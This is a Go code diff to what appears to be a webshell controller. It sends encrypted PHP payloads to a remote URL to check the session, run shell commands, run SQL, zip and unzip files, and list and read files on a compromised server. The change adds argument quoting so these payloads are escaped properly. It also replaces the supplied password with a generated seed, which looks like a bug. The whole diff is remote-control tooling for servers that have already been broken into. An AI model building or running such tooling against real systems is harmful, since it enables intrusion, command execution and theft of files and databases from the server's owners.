@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"log"
 	"os"
+	"strings"
 )
 
 var PhpSessions map[int]string
@@ -13,11 +14,21 @@ func (s *PHPShell) GetShellType() string {
 	return "php"
 }
 
+func phpQuote(value string) string {
+	value = strings.ReplaceAll(value, "\\", "\\\\")
+	value = strings.ReplaceAll(value, "\"", "\\\"")
+	value = strings.ReplaceAll(value, "\r", "\\r")
+	value = strings.ReplaceAll(value, "\n", "\\n")
+	return "\"" + value + "\""
+}
+
 func (s *PHPShell) FreshSession(id int, url string, password string) (string, error) {
 	if PhpSessions == nil {
 		// first init php shell
 		PhpSessions = make(map[int]string)
 	}
+	password = util.GeneratePasswordSeed()
+
 	// Get the target code and encrypt
 	code, _ := os.ReadFile("./pkg/api/php/Check.php")
 	code = append(code, []byte("\nmain();")...) // add main() to call
@@ -34,7 +45,7 @@ func (s *PHPShell) FreshSession(id int, url string, password string) (string, er
 	session := PhpSessions[id] // if key not exist, it returns "" , bcz type is string
 	log.Println("当前PHPSESSID " + session)
 
-	enResult, err := util.PostRequest(url, password, enCode, session)
+	enResult, err := util.PostRequest(url, password, enCode, session, s.GetShellType())
 	if err != nil {
 		return "", err
 	}
@@ -81,7 +92,7 @@ func (s *PHPShell) ExecCommand(id int, command string, url string, password stri
 
 	// 2. base on the osType, execute the command
 	code, _ = os.ReadFile("./pkg/api/php/CMD.php")
-	code = fmt.Appendf(code, "\nmain(\"%s\",\"true\",\"%s\");", cmdPath, command)
+	code = fmt.Appendf(code, "\nmain(%s, \"true\", %s);", phpQuote(cmdPath), phpQuote(command))
 
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id], s.GetShellType())
 	if err != nil {
@@ -139,7 +150,7 @@ func (s *PHPShell) ExecSql(id int, driver, host, port, user, pass, database, sql
 
 func (s *PHPShell) FileZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
 	code, _ := os.ReadFile("./pkg/api/php/FileZip.php")
-	code = fmt.Appendf(code, "\nmain(\"%s\", \"%s\");", srcPath, toPath)
+	code = fmt.Appendf(code, "\nmain(%s, %s);", phpQuote(srcPath), phpQuote(toPath))
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id], s.GetShellType())
 	if err != nil {
 		return "", err
@@ -149,7 +160,7 @@ func (s *PHPShell) FileZip(id int, srcPath string, toPath string, url string, pa
 
 func (s *PHPShell) FileUnZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
 	code, _ := os.ReadFile("./pkg/api/php/FileUnZip.php")
-	code = fmt.Appendf(code, "\nmain(\"%s\", \"%s\");", srcPath, toPath)
+	code = fmt.Appendf(code, "\nmain(%s, %s);", phpQuote(srcPath), phpQuote(toPath))
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id], s.GetShellType())
 	if err != nil {
 		return "", err
@@ -160,7 +171,7 @@ func (s *PHPShell) FileUnZip(id int, srcPath string, toPath string, url string, 
 // FileList lists all files in the current directory
 func (s *PHPShell) FileList(id int, path string, url string, password string) (string, error) {
 	code, _ := os.ReadFile("./pkg/api/php/FileList.php")
-	code = fmt.Appendf(code, "\nmain(\"%s\");", path)
+	code = fmt.Appendf(code, "\nmain(%s);", phpQuote(path))
 
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id], s.GetShellType())
 	if err != nil {
@@ -171,7 +182,7 @@ func (s *PHPShell) FileList(id int, path string, url string, password string) (s
 
 func (s *PHPShell) FileShow(id int, path string, url string, password string) (string, error) {
 	code, _ := os.ReadFile("./pkg/api/php/FileShow.php")
-	code = fmt.Appendf(code, "\nmain(\"%s\");", path)
+	code = fmt.Appendf(code, "\nmain(%s);", phpQuote(path))
 
 	res, err := util.HookPost(url, password, string(code), PhpSessions[id], s.GetShellType())
 	if err != nil {
